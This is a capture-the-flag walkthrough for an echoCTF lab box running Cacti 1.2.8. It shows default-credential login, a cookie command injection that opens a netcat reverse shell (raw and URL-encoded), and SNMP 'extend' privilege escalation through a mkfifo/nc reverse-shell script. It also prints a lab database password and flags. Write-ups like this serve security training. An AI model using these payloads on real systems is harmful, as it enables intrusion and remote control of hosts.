echored CTF
└─# nmap -sV -Pn -p- --min-rate 5000 $ip
Not shown: 62284 filtered tcp ports (no-response), 3250 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped

found cacti : http://10.0.30.124/cacti/
first and foremost i will search for default credentials in cacti
Now time to hit some research finding some default credentials luckily i came accross guest/guest and boom we are in.
I can use these exploits
```
└─# searchsploit cacti 1.2.8
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Cacti 1.2.8 - Authenticated Remote Code Execution                                     | multiple/webapps/48144.py
Cacti 1.2.8 - Remote Code Execution                                                   | php/webapps/48128.py
Cacti 1.2.8 - Unauthenticated Remote Code Execution                                   | multiple/webapps/48145.py
Cacti v1.2.8 - Unauthenticated Remote Code Execution (Metasploit)                     | php/webapps/48159.rb
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                               ```
But i will use manual mode using the authenticated mode.
I visited this : http://10.0.30.124/cacti/graph_realtime.php?action=countdown&top=0&left=0&local_graph_id=1826
and intercepted request
the vulnerable is the cookie sessions, i encoded my payload on an url encode, to get a reverse shell
and i used this : `;nc${IFS}-e${IFS}/bin/bash${IFS}10.10.5.230${IFS}1337 `for burpsuite
%3Bnc%24%7BIFS%7D%2De%24%7BIFS%7D%2Fbin%2Fbash%24%7BIFS%7D10%2E10%2E5%2E230%24%7BIFS%7D1337

and i got my shell : └─# nc -lvnp 1337                       
listening on [any] 1337 ...
connect to [10.10.5.230] from (UNKNOWN) [10.0.30.124] 43312
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

export TERM=xterm

PrivEsc
Ports
```
www-data@nopal:/tmp/Priv$ ss -tupln 
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0      127.0.0.11:47253                 *:*                  
udp    UNCONN     0      0      127.0.0.1:161                   *:*                  
tcp    LISTEN     0      128    127.0.0.11:43013                 *:*                  
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128       *:80                    *:*                   users:(("nginx",pid=442,fd=6),("nginx",pid=441,fd=6))
www-data@nopal:/tmp/Priv$ 
```
I used linpeas
found this :
```
╔══════════╣ Analyzing Backup Manager Files (limit 70)

-rw-rw-r-- 1 www-data www-data 52208 Dec  8  2019 /opt/cacti/lib/database.php
    $len = db_get_column_length('user_auth', 'password');
        $len = db_get_column_length('user_auth','password');

```

and also this :
```
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-rw-r-- 1 root root 335 Mar 17  2021 /etc/snmp/snmpd.conf
rocommunity public default
rwcommunity private default
extend etsctf /tmp/snmpd-tests.sh
-rw------- 1 root Debian-snmp 1075 Sep 21 01:57 /var/lib/snmp/snmpd.conf

```
for this i found : https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce
go on /etc/snmp
i found 
```
www-data@nopal:/etc/snmp$ cat snmpd.conf
cat snmpd.conf
agentAddress  udp:127.0.0.1:161

view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
sysLocation    ETSCTF_4352d9eb155ffe427fd322e2325d6117
sysContact     echoCTF.RED <info@echoctf.red>
sysServices    72

rocommunity public default
rwcommunity private default
extend etsctf /tmp/snmpd-tests.sh
www-data@nopal:/etc/snmp$ 
```

this is important `extend etsctf /tmp/snmpd-tests.sh` but not exist
for shell
we will create an reverse shell on a file named /tmp/snmpd-tests.sh

www-data@nopal:/tmp$ cat snmpd-tests.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.5.230 1337 >/tmp/f
www-data@nopal:/tmp$ 

and then run it using `snmpwalk 127.0.0.1 -c public -v1 . -On`

also
```
╔══════════╣ Analyzing Cacti Files (limit 70)
drwxr-xr-x 1 www-data www-data 4096 Mar 17  2021 /opt/cacti
-rw-rw-r-- 1 www-data www-data 2271 Mar 17  2021 /opt/cacti/include/config.php
$database_type = "mysql";
$database_default = "cacti";
$database_username = "cacti";
$database_password = "xoconostle";
$database_port = "3306";
$database_ssl = false;
```

ETSCTF_ad86513df28d09237b319c265668d5f1